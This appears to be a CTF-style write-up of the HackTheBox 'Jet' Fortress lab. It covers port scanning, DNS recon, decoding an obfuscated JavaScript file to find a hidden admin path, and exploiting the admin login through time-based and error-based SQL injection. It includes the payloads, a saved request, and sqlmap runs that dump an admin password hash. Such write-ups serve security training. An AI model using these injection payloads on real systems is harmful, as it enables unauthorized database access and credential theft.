---
title: "Hackthebox: Jet [Fortress]"
author: c3l1kd
categories: [Hackthebox]
tags:
  [
    nmap,
    wfuzz,
    dns-recon,
    dig,
    etc-hosts,
    javascript-decoding,
    fromCharCode,
    sql-injection,
    burpsuite,
    sqlmap,
    http,
    ssh,
    reverse-dns,
    php,
    web-fuzzing,
    authentication-bypass,
  ]
render_with_liquid: false
img_path: /images/hackthebox_jet/
image:
  path: room_image.png
---

**Jet [Fortress]**In this lab, you will explore various security challenges. First, you'll <code class="highlight">Connect</code> to the environment and get started. As you progress, begin <code class="highlight">Digging in</code> to uncover hidden information. Move <code class="highlight">Going Deeper</code> to analyze and bypass authentication mechanisms. You'll learn how to handle **<code class="highlight">Command</code> execution vulnerabilities and buffer <code class="highlight">Overflown</code> exploits. There’s also a hidden <code class="highlight">Secret Message</code> that requires careful extraction. Understand the concept of <code class="highlight">Elasticity</code> in environments, and manage users with the <code class="highlight">Member Manager</code> feature. Lastly, uncover <code class="highlight">More Secrets</code> in the system and decode the final <code class="highlight">Memo</code>.

<style>
    .highlight {
 background-color: #ffeb3b;
      padding: 0 5px;
      color: red;
      border-radius: 3px;
}
</style>

[![Hackthebox Room Link](room_banner.png)](https://app.hackthebox.com/fortresses/1)
## Initial Enumeration

### Nmap Scan

```console
$ nmap 10.13.37.10
Nmap scan report for 
PORT     STATE SERVICE  
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
5555/tcp open  freeciv
7777/tcp open  cbt
```

There are five open ports:

- **22** (SSH)
- **53/tcp**  (domain)
- **80/tcp**  (http)
- **5555/tcp**   (freeciv)
- **7777/tcp**   (cbt)


## First Flag [Method 1]

If we look at the website we can see a default page and also the `flag`.

![First Flag](01.png){: width="1200" height="800" }

## First Flag [Method 2]

We can see it from the console with a request curl looping through the string `JET`

```console
$ curl -s 10.13.37.10 | grep JET  
<b> JET{s*********k} </b>
```

## Digging in…

When we try to apply `fuzzing` to the web we only find several files, `.ht` however they return a code `403` so we simply do not have access

```console
$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.37.10/FUZZ -t 100 --hc 404  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.37.10/FUZZ
Total requests: 4713

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000023:   403        7 L      11 W       178 Ch      ".hta"
000000024:   403        7 L      11 W       178 Ch      ".htaccess"
000000025:   403        7 L      11 W       178 Ch      ".htpasswd"
```

We have the port open `53` so we can perform a reverse resolution query `DNS` to get an `dominio` associated IP address

```console
$ dig@10.13.37.10 -x 10.13.37.10

; <<>> DiG 9.18.12-1-Debian <<>> @10.13.37.10 -x 10.13.37.10
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 19872
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.      IN      PTR

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.  604800  IN      SOA     www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800  

;; Query time: 96 msec
;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)
;; WHEN: Tue Apr 11 12:20:24 EDT 2023
;; MSG SIZE  rcvd: 109
```

that it knows where to resolve each time we point to it `dominio` , we add to the file `/etc/hosts` the address ip of the machine followed by the domain we have.

```console
$ echo "10.13.37.10 www.securewebinc.jet" | sudo tee -a /etc/hosts 
```

By visiting the web this time from dominio the bottom we can again `flag`


![Second Flag](02.jpeg){: width="1200" height="800" }

## Going Deeper
In the `codigo` page source we can see that it loads 2 files with extension `js` , one is the template and the other has a rather interesting name: `secure.js`

![js files](03.png){: width="1200" height="800" }

We open it and find that it is not in clear text but in decimal.

![decimal](04.png){: width="1200" height="800" }

We can see it more comfortably from a request curl , the script converts the decimals to text with fromCharCode the String class and executes it witheval

```console
$ curl -s www.securewebinc.jet/js/secure.js
eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
```
Instead of running it with `eval` after passing it to text we can use a simple console.log to show the content in text on the console

```console
$ console.log(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
```
When we run it we can see that it makes a request to stats.php a directory which ruta would have been impossible to obtain by applying brute force.

```console
function getStats()
{
    $.ajax({url: "/dirb_safe_dir_rf9EmcEIx/admin/stats.php",  

        success: function(result){
        $('#attacks').html(result)
    },
    error: function(result){
         console.log(result);
    }});
}
getStats();
setInterval(function(){ getStats(); }, 10000);
```

By pointing to the directory and the file `stats.php` we can see that it returns only a numero which is not really clear what its purpose is.

![stats.php](05.png){: width="1200" height="800" }

If we remove it stats.php and stay on it /admin redirects us to login.php

![admin](06.png){: width="1200" height="800" }

In the codigo source login.php we find the flag in a comment


![Third Flag](07.png){: width="1200" height="800" }

## Bypassing Authentication

We have a `login` , default credentials as `admin:admin` they will not work for us

![login](08.png){: width="1200" height="800" }

However, when passing it as a name, `admin' and sleep(5)-- -` the website takes 5 seconds to give us a response, which means that it is vulnerable to a `inyeccion sql`

![inyeccion sql](09.png){: width="1200" height="800" }

By intercepting the request with burpsuite we can see how the data is processed

![brup](10.png){: width="1200" height="800" }

Let’s go with the easy way, we start by saving the request in a filerequest

```console

$ cat request
POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1  
Host: www.securewebinc.jet
Content-Length: 47
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.securewebinc.jet
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9,en;q=0.8
Cookie: PHPSESSID=3aljq5nfoi1t34idu2dkm55nt2
Connection: close

username=admin&password=admin
```

We can use it `sqlmap` by passing it `-r` the request file and with the parameter `-dbs` we list the databases, we can find the dbjet `admin`

```console
$ sqlmap -r request --batch -dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:11:01] [INFO] parsing HTTP request from 'request'
[12:11:03] [INFO] resuming back-end DBMS 'mysql' 
[12:11:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7805 FROM (SELECT(SLEEP(5)))BrBS)-- vOGO&password=admin  
---
[12:11:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0
[12:11:03] [INFO] fetching database names
[12:11:03] [INFO] resumed: 'information_schema'
[12:11:03] [INFO] resumed: 'jetadmin'
available databases [2]:
[*] information_schema
[*] jetadmin
```

Now we list the tables with `-tables` indicating the database `jetadmin` with the parameter `-D` , we can find only the table `users` in that database

```console
$ sqlmap -r request --batch -D jetadmin -tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:12:49] [INFO] parsing HTTP request from 'request'
[12:12:49] [INFO] resuming back-end DBMS 'mysql' 
[12:12:49] [INFO] testing connection to the target URL
[12:12:50] [INFO] the back-end DBMS is MySQL
[12:12:50] [INFO] fetching tables for database: 'jetadmin'  
[12:12:50] [INFO] resumed: 'users'
Database: jetadmin
[1 table]
+-------+
| users |
+-------+
```

Now we can simply use the parameter `-dump` to dump all the existing columns in the users table and get a `hash` user `admin`


```console
$ sqlmap -r request --batch -D jetadmin -T users -dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:14:33] [INFO] parsing HTTP request from 'request'
[12:14:34] [INFO] resuming back-end DBMS 'mysql' 
[12:14:34] [INFO] testing connection to the target URL
[12:14:34] [INFO] the back-end DBMS is MySQL
[12:14:34] [INFO] fetching columns for table 'users' in database 'jetadmin'
[12:14:34] [INFO] resumed: 'id'
[12:14:34] [INFO] resumed: 'int(11)'
[12:14:34] [INFO] resumed: 'username'
[12:14:34] [INFO] resumed: 'varchar(50)'
[12:14:34] [INFO] resumed: 'password'
[12:14:34] [INFO] resumed: 'varchar(191)'
[12:14:34] [INFO] fetching entries for table 'users' in database 'jetadmin'
[12:14:34] [INFO] resumed: '1'
[12:14:34] [INFO] resumed: '97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084'  
[12:14:34] [INFO] resumed: 'admin'
Database: jetadmin
Table: users
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+
```
We saw that it can be listed with a `sql injection` time based, however when sending only one `'` as a username field it returns a 302 but before a `error`



![brup](11.png){: width="1200" height="800" }

Based on an [article](https://securiumsolutions.com/blog/sql-injection-by-double-query-securiumsolutions/) we can create one `query` for a sqli `error` based `doble query` to list the database in use `withdatabase()`

```query
' or (select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
```

It should be noted that to send it we need `url condearlo` to do it from burpsuite with `Ctrl U` , we send and see in the response `jetadmin`

![jetadmin](12.png){: width="1200" height="800" }